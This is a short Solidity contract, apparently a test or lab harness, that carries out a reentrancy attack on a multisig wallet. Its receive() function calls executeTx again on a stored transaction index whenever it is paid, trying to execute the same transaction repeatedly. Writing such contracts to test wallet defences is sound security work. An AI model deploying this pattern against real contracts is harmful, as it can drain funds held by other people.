// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMultisig {
    function submitTx(address _to, uint256 _value, bytes calldata _data) external;
    function confirmTx(uint256 index) external;
    function executeTx(uint256 index) external;
}

contract Reentrancy {
    IMultisig public multisig;
    uint256 public attackIndex;

    constructor(address _multisig) {
        multisig = IMultisig(_multisig);
    }

    receive() external payable {
        multisig.executeTx(attackIndex);
    }

    function attack(uint256 _index) external {
        attackIndex = _index;
    }
}
